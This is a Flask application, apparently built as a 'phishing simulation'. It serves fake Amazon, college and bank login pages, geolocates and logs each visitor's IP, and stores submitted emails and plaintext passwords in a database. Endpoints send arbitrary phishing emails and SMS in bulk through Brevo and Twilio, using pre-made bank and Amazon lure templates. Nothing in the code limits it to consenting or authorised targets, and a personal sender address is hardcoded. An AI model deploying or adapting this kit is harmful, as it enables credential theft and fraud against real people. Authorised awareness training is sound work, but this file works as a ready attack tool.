import os
import requests
from flask import Flask, jsonify, request, render_template, redirect, url_for
from flask_cors import CORS
from dotenv import load_dotenv
from supabase import create_client, Client
import brevo_python as brevo
from twilio.rest import Client as TwilioClient
from datetime import datetime

# --- Load Environment Variables ---
load_dotenv()

# --- Initialize Flask App ---
app = Flask(__name__, static_folder='static', static_url_path='/static')
CORS(app)

# --- Service Configurations ---

# Supabase Setup
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
if not all([SUPABASE_URL, SUPABASE_KEY]):
    print("⚠️ Warning: Supabase environment variables not set. Visitor/Login logging will fail.")
    supabase: Client = None
else:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Brevo (Email) Setup
BREVO_API_KEY = os.getenv('BREVO_API_KEY')
if not BREVO_API_KEY:
    print("⚠️ Warning: Brevo API key not set. Email functionality will not work.")
    brevo_api_instance = None
else:
    brevo_configuration = brevo.Configuration()
    brevo_configuration.api_key['api-key'] = BREVO_API_KEY
    brevo_api_instance = brevo.TransactionalEmailsApi(brevo.ApiClient(brevo_configuration))

# Twilio (SMS) Setup
TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")
if not all([TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_PHONE_NUMBER]):
    print("⚠️ Warning: Twilio environment variables not set. SMS functionality will not work.")
    twilio_client = None
else:
    twilio_client = TwilioClient(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# --- Helper Functions ---

def log_visitor_to_supabase(ip, user_agent):
    """Logs visitor information to the 'visitor_logs' table in Supabase."""
    if not supabase:
        print("Error: Supabase client not initialized. Cannot log visitor.")
        return

    location, city, country, isp = "Unknown", "Unknown", "Unknown", "Unknown"
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        data = response.json()
        if data.get("status") == "success":
            city = data.get("city", "Unknown")
            country = data.get("country", "Unknown")
            isp = data.get("isp", "Unknown")
            location = f"{city}, {country} (ISP: {isp})"
    except requests.exceptions.RequestException as e:
        print(f"Geo lookup failed: {e}")

    try:
        visitor_data = {
            "ip_address": ip,
            "user_agent": user_agent,
            "timestamp": datetime.now().isoformat(),
            "location": location,
            "city": city,
            "country": country,
            "isp": isp,
        }
        supabase.table('visitor_logs').insert(visitor_data).execute()
        print(f"Successfully logged visitor: {ip}")
    except Exception as e:
        print(f"Error sending visitor data to Supabase: {e}")


def send_email(recipients, subject, html_content):
    """Sends email using Brevo API."""
    if not brevo_api_instance:
        raise ConnectionError("Brevo client is not configured.")
    results = []
    sender_email = "dchitale07@gmail.com" # Replace with your sender email if needed
    sender_name = "Test Sender" # Replace with your sender name if needed
    for r in recipients:
        try:
            send_smtp_email = brevo.SendSmtpEmail(
                sender={"name": sender_name, "email": sender_email},
                to=[{"email": r["email"], "name": r.get("name", "")}],
                subject=subject,
                html_content=html_content
            )
            brevo_api_instance.send_transac_email(send_smtp_email)
            results.append({"email": r["email"], "status": "sent"})
        except Exception as e:
            results.append({"email": r["email"], "status": "failed", "error": str(e)})
    return results

def send_sms(recipient_numbers, message):
    """Sends SMS using Twilio API."""
    if not twilio_client:
        raise ConnectionError("Twilio client is not configured.")
    results = []
    for number in recipient_numbers:
        try:
            msg = twilio_client.messages.create(body=message, from_=TWILIO_PHONE_NUMBER, to=number)
            results.append({"number": number, "status": "sent", "sid": msg.sid})
        except Exception as e:
            results.append({"number": number, "status": "failed", "error": str(e)})
    return results

# --- Primary Phishing Simulation Routes ---

@app.route("/", methods=['GET'])
def phishing_landing():
    """Logs visitor and shows the fake login page."""
    try:
        # Get IP address, handling proxies
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        user_agent = request.headers.get('User-Agent')
        log_visitor_to_supabase(ip, user_agent)
    except Exception as e:
        print(f"Error during visitor logging: {e}")
    
    return render_template('amazon_login.html')

@app.route("/amazon_login", methods=['POST'])
def handle_login():
    """Captures credentials and redirects to the phishing info page."""
    if not supabase:
        print("Error: Supabase client not initialized. Cannot save credentials.")
        return redirect(url_for('phishing_info')) # Redirect anyway

    try:
        email = request.form.get('email')
        password = request.form.get('password')
        
        login_data = {
            "email": email,
            "password": password,
            "login_time": datetime.now().isoformat()
        }
        supabase.table('logins').insert(login_data).execute()
        print(f"Successfully captured credentials for: {email}")
    except Exception as e:
        print(f"Error sending login data to Supabase: {e}")
        
    return redirect(url_for('phishing_info'))

@app.route("/college_login", methods=['POST'])
def college_login():
    """Captures credentials and redirects to the phishing info page."""
    if not supabase:
        print("Error: Supabase client not initialized. Cannot save credentials.")
        return redirect(url_for('phishing_info')) # Redirect anyway

    try:
        email = request.form.get('email')
        password = request.form.get('password')
        
        login_data = {
            "email": email,
            "password": password,
            "login_time": datetime.now().isoformat()
        }
        supabase.table('logins').insert(login_data).execute()
        print(f"Successfully captured credentials for: {email}")
    except Exception as e:
        print(f"Error sending login data to Supabase: {e}")
        
    return redirect(url_for('phishing_info'))

@app.route("/bank_login", methods=['POST'])
def bank_login():
    """Captures credentials and redirects to the phishing info page."""
    if not supabase:
        print("Error: Supabase client not initialized. Cannot save credentials.")
        return redirect(url_for('phishing_info')) # Redirect anyway

    try:
        email = request.form.get('email')
        password = request.form.get('password')
        
        login_data = {
            "email": email,
            "password": password,
            "login_time": datetime.now().isoformat()
        }
        supabase.table('logins').insert(login_data).execute()
        print(f"Successfully captured credentials for: {email}")
    except Exception as e:
        print(f"Error sending login data to Supabase: {e}")
        
    return redirect(url_for('phishing_info'))

@app.route("/phish", methods=['GET'])
def phishing_info():
    """Displays the educational page about the phishing simulation."""
    return render_template('phish.html')

# --- Messaging Sender Routes ---

@app.route("/email_send", methods=['GET'])
def email_sender_page():
    """Renders the email sending UI."""
    return render_template('email_send.html')

@app.route("/bank_sms_txt", methods=['GET'])
def bank_template_page():
    """Renders the pre-made phishing bank sms template."""
    return render_template('bank_sms_txt.html')

@app.route("/college_login", methods=['GET'])
def college_login_page():
    """Renders the phishing college login page."""
    return render_template('college_login.html')

@app.route("/sms_send", methods=['GET'])
def sms_sender_page():
    """Renders the SMS sending UI."""
    return render_template('sms_send.html')

@app.route("/amazon_email", methods=['GET'])
def email_template_page():
    """Renders the pre-made phishing amazon email template."""
    return render_template('amazon_email.html')

@app.route("/amazon_sms_txt", methods=['GET'])
def sms_template_page():
    """Renders the pre-made phishing amazon SMS template."""
    return render_template('amazon_sms_txt.html')

@app.route("/amazon_login", methods=['GET'])
def amazon_login_page():
    """Renders the phishing amazon login page."""
    return render_template('amazon_login.html')

# --- API Routes for Sending Messages ---

@app.route("/send-email", methods=['POST'])
def trigger_email():
    try:
        data = request.get_json()
        recipients = data.get("recipients")
        subject = data.get("subject")
        message = data.get("message")

        if not all([recipients, subject, message]) or not isinstance(recipients, list):
            return jsonify({"error": "Invalid payload. 'recipients' (list), 'subject', and 'message' are required."}), 400

        results = send_email(recipients, subject, message)
        failed = [res for res in results if res['status'] == 'failed']
        if failed:
            return jsonify({"error": f"Failed to send to: {', '.join([f['email'] for f in failed])}"}), 500
        return jsonify({"message": f"Successfully sent email to {len(recipients)} recipient(s)."}), 200
    except Exception as e:
        return jsonify({"error": f"An internal server error occurred: {str(e)}"}), 500

@app.route("/send-sms", methods=['POST'])
def trigger_sms():
    try:
        data = request.get_json()
        recipient_numbers = data.get("recipient_numbers")
        message = data.get("message")

        if not all([recipient_numbers, message]) or not isinstance(recipient_numbers, list):
            return jsonify({"error": "Invalid payload. 'recipient_numbers' (list) and 'message' are required."}), 400

        results = send_sms(recipient_numbers, message)
        failed = [res for res in results if res['status'] == 'failed']
        if failed:
            return jsonify({"error": f"Failed to send to: {', '.join([f['number'] for f in failed])}"}), 500
        return jsonify({"message": f"Successfully sent SMS to {len(recipient_numbers)} number(s)."}), 200
    except Exception as e:
        return jsonify({"error": f"An internal server error occurred: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)
